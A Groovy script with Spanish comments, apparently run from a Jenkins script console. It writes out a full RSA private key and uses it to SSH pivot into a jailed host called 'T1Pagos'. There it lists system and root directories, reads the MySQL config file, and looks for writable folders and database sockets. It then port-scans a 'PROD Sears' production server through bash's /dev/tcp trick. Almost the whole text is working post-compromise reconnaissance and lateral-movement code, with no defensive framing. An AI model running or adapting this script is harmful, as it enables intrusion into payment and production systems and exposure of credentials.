// Explorar jail SSH en T1Pagos + leer logs MySQL + probar alcance a PROD Sears
// Sistema: uid=556(jenkins), jailed en /var/www/sites

def exec = { cmd ->
    def proc = cmd.execute()
    def out = new StringBuilder()
    def err = new StringBuilder()
    proc.consumeProcessOutput(out, err)
    proc.waitForOrKill(20000)
    return out.toString() + (err.toString() ? "\nSTDERR:" + err.toString() : "")
}

def sshExec = { cmd ->
    def fullCmd = ["bash", "-c", "ssh -i /tmp/ssh_pivot/id_rsa -o StrictHostKeyChecking=no -o ConnectTimeout=10 -o BatchMode=yes jenkins@172.27.141.4 \"${cmd.replace('"', '\\"')}\" 2>&1"]
    def r = exec(fullCmd)
    return r
}

// Ensure key exists
exec(["bash", "-c", "ls /tmp/ssh_pivot/id_rsa 2>/dev/null || (mkdir -p /tmp/ssh_pivot && cat > /tmp/ssh_pivot/id_rsa << 'EOF'\n-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEApeSSUiBjXCxjR9bWb90AUJ0SbLANv030lZvUY2Bc7a4VZPXc\ngfvTSAmIvMiNiEPR/+hsrUhHtDtz55JqtKzk4jBxBUUFcaIreqOmKyxv3hCEmMAu\nFLPiFTdiIkDs3Wpu+6JNney6PLuxOlffhA4zuS4JpNZfZz1EeEC3AIK3zLLbSp9Y\n8EFJ4oO8QAZ65n4dS/f/G+U/qckJjv9pCB/c64hun3h4Ilw34Bx24q4jOTTy1HHz\nAzWEGhjBLZqaNf+mxDTulXy3LCi5esPE4ILjoXFHrPD2t9hF1h6JqRUjNbsP+AMt\nmFUyShPBoWEy/t/8Z4CislFQHtRyMIScbo4QywIBIwKCAQEAoScvDfOTuKAl7gPm\nQMgO7zl/nMhH3mj8OZAQJgXWnb8NeATHlDZ1eS3VSazhQosGg5FToQRi6ZjW/jZ2\nSRz7meXqImBObmMFqlXUnvf3pIUTGAslczJmmERt9WOkRM3K5dDdr1r+Dxy6yvZG\n2A3L2HXde45rTljGK6yUhCc2NI7sr9UFoTMZ6Tzjrk8OhWdLUxDtQVwwpacDwahW\nXbaV5B+vnqS2MTBJ61jZpCVRl504NFO2rg2O1Lg3E8CgzLDY7A159gAG5xKaiVM3\n6JUBp377x0OJNhCunPI0q/UoyGvf5VJwjoLflTbZqrQl2FpNA7FFiLa9eJqsWYJV\n8LNliwKBgQDUc0bi+0M3ByuMFqRgCAIr7mv6KTA5kF08cVQNIzL5bAO3n+ejIKRf\nRFBmjKUGAuz6v4FgE8pX892IUSt/fOzd/g4Z4nYuntmOSHmsStwWyNhfobbR0c9O\nbJnxjtCFI1mjBDSkJYVZ0MQvQ9sgDIvAH4sVq3sWgDtdILPPI5opSwKBgQDH5htK\ng8Hwp3tj5uOL677JePqYPnvE9m0NA34SC/w6I75zJ4zsR42qof+ow6Z2ZYB6dal1\nAALc4dfxGuyTT8YltQnmNcpFNgdP4Skiy+A8FZYwJ4OuPXBDqdaPDuZdgEy7LWMV\nlNCnBVrfeRfr/QZWac4fzOzvC9u9/vfPLYaGgQKBgQDOYVrN3iQJke/J6hwFhB9d\n4EuijmlcfZxmmfng4F1nUvxL+mv9jWx5zVVq7wa1Ye2F3prvnjJGz6QAw+Ecwn+z\nFA2yvrvyxjJs9fKKHNXM/Z790EsyOYeOAxkzzJAMTjnRjw6Q0/3iOIQQqFE1E4Bx\nfbpPkKN08ZjA3fCAE/TXpwKBgQDCL/1BEkdezpUfOBA+x8CmdYW4dzZnkEytjl02\nGkV6TpvAUk5h3xvnlg5MK8ZHIMXzTbqO6hFo22QOybKduzWDty4wFv8BZ69U6Vsp\nHdKDgq8ndtewk3Re/MHMzKVE4wi11FGf76Yel3zZFoxEVOGVxd4thT3vh9zHMjKO\nvoKuiwKBgFZ4LHsqhnU/o7DBdV6FB67pWtrVCZNGNf30Swd9PFzGJbSCXRKJ9Iwd\njYqClYgkyxylo5H6Nzl0Y7wGqKoGBWMIOvpkG0mrSOYMB0iGwXnWS1g94xeRw32k\nCtOrnvIVC8SKdmm5H+uzoN+WpSwC+oRkS7cIGjzthuw7omygk1ng\n-----END RSA PRIVATE KEY-----\nEOF\nchmod 600 /tmp/ssh_pivot/id_rsa)"
])

println "=== JAIL EXPLORATION ==="
println "\n--- Available bins in /bin ---"
println sshExec("ls /bin/")

println "\n--- Available bins in /usr/bin ---"
println sshExec("ls /usr/bin/")

println "\n--- Available bins in /usr/sbin ---"
println sshExec("ls /usr/sbin/")

println "\n--- Available in /opt ---"
println sshExec("ls /opt/")

println "\n--- Logs MySQL ---"
println sshExec("ls -la /logs_mysql/")

println "\n--- /etc contents ---"
println sshExec("ls /etc/")

println "\n--- MySQL config ---"
println sshExec("cat /etc/my.cnf")

println "\n--- shared_cshop listing ---"
println sshExec("ls /shared_cshop/ 2>&1 | tail -5")

println "\n--- /home listing ---"
println sshExec("ls /home/")

println "\n--- /root listing ---"
println sshExec("ls /root/")

println "\n--- PHP config files with DB ---"
println sshExec("ls /var/www/sites/")

println "\n--- Find writable dirs ---"
println sshExec("ls -la /tmp/ 2>&1 || ls -la /var/tmp/ 2>&1")

println "\n=== NETWORK PROBE FROM JAIL ==="
// Check if we can use /dev/tcp bash trick
println "\n--- Test TCP /dev/tcp to PROD Sears ---"
println sshExec("(echo > /dev/tcp/172.27.141.24/3308) 2>&1 && echo 'SEARS 3308 OPEN' || echo 'SEARS 3308 CLOSED'")
println sshExec("(echo > /dev/tcp/172.27.141.24/3306) 2>&1 && echo 'SEARS 3306 OPEN' || echo 'SEARS 3306 CLOSED'")
println sshExec("(echo > /dev/tcp/172.27.141.24/22) 2>&1 && echo 'SEARS SSH OPEN' || echo 'SEARS SSH CLOSED'")

println "\n--- MySQL socket in /logs_mysql ---"
println sshExec("ls -la /logs_mysql/*.sock 2>&1 || ls -la /var/lib/mysql/*.sock 2>&1 || ls -la /tmp/mysql*.sock 2>&1")

println "\n--- MySQL binary location ---"
println sshExec("ls /usr/bin/mysql /usr/local/bin/mysql /usr/local/mysql/bin/mysql /opt/*/bin/mysql 2>&1")

println "\n=== FIN EXPLORATION ==="
